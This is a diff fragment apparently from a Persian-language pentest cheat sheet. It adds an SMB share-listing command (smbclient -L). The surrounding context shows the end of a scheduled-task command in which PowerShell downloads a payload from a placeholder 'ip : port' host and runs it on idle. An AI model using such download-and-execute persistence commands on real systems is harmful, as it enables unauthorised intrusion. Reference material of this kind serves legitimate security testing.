@@ -1360,5 +1360,12 @@ net.webclient) .downloadstring("http:// ip : port I payload"))'" /SC
 onidle /i 30
 ```
 
+## دستورات کار با smb
+
+### نمایش مسیر به اشتراک گذاشته شده
+
+```text
+smbclient -L 10.10.10.10
+```
 
 
